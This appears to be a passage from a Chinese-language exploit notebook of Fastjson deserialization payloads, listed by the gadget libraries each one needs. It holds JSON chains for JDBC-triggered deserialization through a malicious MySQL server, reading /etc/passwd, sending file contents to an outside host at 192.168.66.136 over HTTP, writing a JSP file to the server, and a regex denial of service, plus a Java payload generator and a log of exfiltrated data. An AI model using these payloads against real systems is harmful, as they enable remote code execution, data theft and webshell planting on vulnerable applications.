{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
			"proxy": {
        		"connectionString": {
            		"url": "jdbc:mysql://192.168.66.136:3306/test?allowLoadLocalInfile=true&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc"
        		}
    		}
		}
	}
}
```

#### 8.0.19
```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
			"proxy":{
				"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
				"connectionUrl":{
					"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",
					"masters":[{"host":"127.0.0.1"}],
					"slaves":[],
					"properties":{
						"host":"127.0.0.1",
						"port":"3306",
						"connectionAttributes":"t:cb32",
						"user":"yso_CommonsCollections4_calc",
						"dname":"dname",
						"password":"password",
						"queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
						"autoDeserialize":"true"
					}
				}
			}
		}
	}
}
```

## AspectJ Tools (Compiler)文件读取
```xml
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
```
1.7.0<=version<=1.9.9

poc需要分三次打，web项目可用
poc1
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
```
poc2
```json
   {
      "@type":"java.lang.Class",
      "val":{
         "@type":"java.lang.String"{
      "@type":"java.util.Locale",
      "val":{
         "@type":"com.alibaba.fastjson.JSONObject",{
      "@type":"java.lang.String"
      "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
      "newAnnotationProcessorUnits":[{}]
   }
}
}
```

根据利用环境有多种poc3
### 有回显
```json
{
    "x":{
        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName":"/etc/passwd"
    }
}
```
### 报错回显
```json
{
  "@type": "java.lang.Character" {
    "C": {
      "x": {
        "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName": "/etc/passwd"
      }
    }
  }
}
```

### dnslog
受限于字符，带出失败
```json
{
    "@type":"java.net.Inet4Address",
    "val":{
        "@type":"java.lang.String"{
        "@type":"java.util.Locale",
        "val":{
            "@type":"com.alibaba.fastjson.JSONObject",{
                "@type":"java.lang.String"
                "@type":"java.util.Locale",
                "country":"fj.ppp.dnslog.pw",
                "language":{
                    "@type":"java.lang.String"{
                    "x":{
				"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
				"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
				"fileName": "/etc/passwd"
			}
                }
            }
        }
    }
  }
}
}
```

## AspectJ  + cc + ognl  http带出文件
```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>  
  
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
```

poc1
```json
[{
		"@type": "java.lang.Exception",
		"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
	},
	{
		"@type": "java.lang.Class",
		"val": {
			"@type": "java.lang.String" {
				"@type": "java.util.Locale",
				"val": {
					"@type": "com.alibaba.fastjson.JSONObject",
					{
						"@type": "java.lang.String"
						"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
						"newAnnotationProcessorUnits": [{}]
					}
				}
			},
			{
				"x": {
					"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
					"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
					"fileName": "aaa"
				}
			}]
```

poc2
```json
{
	"su14": {
		"@type": "java.lang.Exception",
		"@type": "ognl.OgnlException"
	},
	"su15": {
		"@type": "java.lang.Class",
		"val": {
			"@type": "com.alibaba.fastjson.JSONObject",
			{
				"@type": "java.lang.String"
				"@type": "ognl.OgnlException",
				"_evaluation": ""
			}
		},
		"su16": {
			"@type": "ognl.Evaluation",
			"node": {
				"@type": "ognl.ASTMethod",
				"p": {
					"@type": "ognl.OgnlParser",
					"stream": {
						"@type": "org.apache.commons.io.input.BOMInputStream",
						"delegate": {
							"@type": "org.apache.commons.io.input.ReaderInputStream",
							"reader": {
								"@type": "jdk.nashorn.api.scripting.URLReader",
								"url": {
									"@type": "java.lang.String" {
										"@type": "java.util.Locale",
										"val": {
											"@type": "com.alibaba.fastjson.JSONObject",
											{
												"@type": "java.lang.String"
												"@type": "java.util.Locale",
												"language": "http://192.168.66.136:1234/",
												"country": {
													"@type": "java.lang.String" [{
														"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
														"fileName": "tmp"
													}]

												}
											}
										},
										"charsetName": "UTF-8",
										"bufferSize": 1024
									},
									"boms": [{
										"@type": "org.apache.commons.io.ByteOrderMark",
										"charsetName": "UTF-8",
										"bytes": [
											0
										]
									}]
								}
							}
						}
					},
					"su17": {
						"$ref": "$.su16.node.p.stream"
					},
					"su18": {
						"$ref": "$.su17.bOM.bytes"
					}
				}
```
带出文件
```
::ffff:192.168.66.136 - - [17/Oct/2022 10:37:49] "GET /_[{"CONTENTS":"FLAG{THIS IS FLAG}","FILENAME":"TMP","MAINTYPENAME":"TMP"}] HTTP/1.1" 400 -
```

## ognl + io读文件
### 利用报错回显 jdk8
类似1.2.68，但实际测试起来效果不太理想
```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
```

```json
{
	"su14": {
		"@type": "java.lang.Exception",
		"@type": "ognl.OgnlException"
	},
	"su15": {
		"@type": "java.lang.Class",
		"val": {
			"@type": "com.alibaba.fastjson.JSONObject",
			{
				"@type": "java.lang.String"
				"@type": "ognl.OgnlException",
				"_evaluation": ""
			}
		},
		"su16": {
			"@type": "ognl.Evaluation",
			"node": {
				"@type": "ognl.ASTMethod",
				"p": {
					"@type": "ognl.OgnlParser",
					"stream": {
						"@type": "org.apache.commons.io.input.BOMInputStream",
						"delegate": {
							"@type": "org.apache.commons.io.input.ReaderInputStream",
							"reader": {
								"@type": "jdk.nashorn.api.scripting.URLReader",
								"url": "file://tmp"
							},
							"charsetName": "UTF-8",
							"bufferSize": 1024
						},
						"boms": [{
							"@type": "org.apache.commons.io.ByteOrderMark",
							"charsetName": "UTF-8",
							"bytes": [
								116,101,115,116
							]
						}]
					}
				}
			}
		},
		"su17": {
			"$ref": "$.su16.node.p.stream"
		},
		"su18": {
			"$ref": "$.su17.bOM.bytes"
		}
	}
```

### 利用报错布尔
```json
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file://tmp"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
116,101,115,116]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
"$ref":"$[3].su18.bOM.bytes"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[5].su20.node.p.stream"}}]
```

### http报错回显
```json
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file://tmp"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
98]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
"$ref":"$[3].su18.bOM.bytes"}},{"su22":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://192.168.66.136:1234/","country":{"@type":"java.lang.String"{"$ref":"115"}}}}},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su23" : {"$ref":"$[5].su22.node.p.stream"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[7].su20.node.p.stream"}}]
```

## ognl + io 写文件（链子有问题，还要调一下）
### cc低版本 2.0 -2.6
```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
```

```json
{
    "su14": {
        "@type": "java.lang.Exception",
        "@type": "ognl.OgnlException"
    },
    "su15": {
        "@type": "java.lang.Class",
        "val": {
            "@type": "com.alibaba.fastjson.JSONObject",
            {
                "@type": "java.lang.String"
                "@type": "ognl.OgnlException",
                "_evaluation": ""
            }
        },
        "su16": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""test8200个a"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
            "branch":{
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"1.jsp",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su17": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su18": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su19": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        }   
    }
```

### cc 高版本 2.7 2.8
```json
{
    "su14": {
        "@type": "java.lang.Exception",
        "@type": "ognl.OgnlException"
    },
    "su15": {
        "@type": "java.lang.Class",
        "val": {
            "@type": "com.alibaba.fastjson.JSONObject",
            {
                "@type": "java.lang.String"
                "@type": "ognl.OgnlException",
                "_evaluation": ""
            }
        },
        "su16": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""test8200个a",
        "start":0,
        "end":2147483647
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
            "branch":{
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"1.jsp",
        "charsetName":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su17": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su18": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su19": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        }    
    }
```

## ognl + io + aspectj + commons-codec 写文件
需要写入文件大于 8kb
```xml
<dependency>  
    <groupId>commons-codec</groupId>  
    <artifactId>commons-codec</artifactId>  
    <version>1.6</version>  
</dependency>

<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>
```

```java
public void ognl_io_aspectj_code_write(){  
    String str = "test";  
    for (int i = 0; i < 8201; i++){  
        str += "a";  
    }  
  
    byte[] sb = str.getBytes();  
    String baseStr = Base64.getEncoder().encodeToString(sb);  
    byte[] bytes = baseStr.getBytes();  
  
  
    String payload = "\r\n"  
            + "{\r\n"  
            + "    \"su14\": {\r\n"  
            + "       \"@type\": \"java.lang.Exception\",\r\n"  
            + "       \"@type\": \"ognl.OgnlException\"\r\n"  
            + "    },\r\n"  
            + "    \"su15\": {\r\n"  
            + "       \"@type\": \"java.lang.Class\",\r\n"  
            + "       \"val\": {\r\n"  
            + "          \"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"  
            + "          {\r\n"  
            + "             \"@type\": \"java.lang.String\"\r\n"  
            + "             \"@type\": \"ognl.OgnlException\",\r\n"  
            + "             \"_evaluation\": \"\"\r\n"  
            + "          }\r\n"  
            + "       },\r\n"  
            + "       \"su16\": {\r\n"  
            + "          \"@type\": \"ognl.Evaluation\",\r\n"  
            + "          \"node\": {\r\n"  
            + "             \"@type\": \"ognl.ASTMethod\",\r\n"  
            + "             \"p\": {\r\n"  
            + "                \"@type\": \"ognl.OgnlParser\",\r\n"  
            + "                \"stream\": {\r\n"  
            + "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\r\n"  
            + "  \"delegate\":{\r\n"  
            + "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"  
            + "    \"input\":{\r\n"  
            + "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\r\n"  
            + "      \"in\":{\r\n"  
            + "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\r\n"  
            + "        \"charset\":\"utf-8\",\r\n"  
            + "        \"bufferSize\": 1024,\r\n"  
            + "        \"s\":{\"@type\":\"java.lang.String\"\""+baseStr+"\"\r\n"  
            + "      },\r\n"  
            + "      \"doEncode\":false,\r\n"  
            + "      \"lineLength\":1024,\r\n"  
            + "      \"lineSeparator\":\"5ZWKCg==\",\r\n"  
            + "      \"decodingPolicy\":0\r\n"  
            + "    },\r\n"  
            + "    \"branch\":{\r\n"  
            + "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\r\n"  
            + "      \"targetPath\":\"1.jsp\"\r\n"  
            + "    },\r\n"  
            + "    \"closeBranch\":true\r\n"  
            + "  },\r\n"  
            + "  \"include\":true,\r\n"  
            + "  \"boms\":[{\r\n"  
            + "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"  
            + "                  \"charsetName\": \"UTF-8\",\r\n"  
            + "                  \"bytes\":"+Arrays.toString(bytes)+"\r\n"  
            + "                }],\r\n"  
            + "}\r\n"  
            + "             }\r\n"  
            + "          }\r\n"  
            + "       },\r\n"  
            + "       \"su17\": {\r\n"  
            + "          \"$ref\": \"$.su16.node.p.stream\"\r\n"  
            + "       },\r\n"  
            + "       \"su18\": {\r\n"  
            + "          \"$ref\": \"$.su17.bOM.bytes\"\r\n"  
            + "       }\r\n"  
            + "    }";  
    System.out.println(payload);  
    JSON.parseObject(payload);  
}
```





# 无@type利用
对于 Fastjson 1.2.36-1.2.62 的版本存在dos漏洞
https://b1ue.cn/archives/314.html
```json
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}

{"regex":{"$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```



# 待测试
1.2.68
```

{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://0.0.0.0"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://0.0.0.0"}
```

1.2.68的写?
```
{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'java.io.FileOutputStream',
        'file':'temp',
        'append':false
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.solr.common.util.FastOutputStream',
        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
        'sink':
        {
            '$ref':'$.stream'
        },
        'start':38
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.iq80.snappy.SnappyOutputStream',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}
```

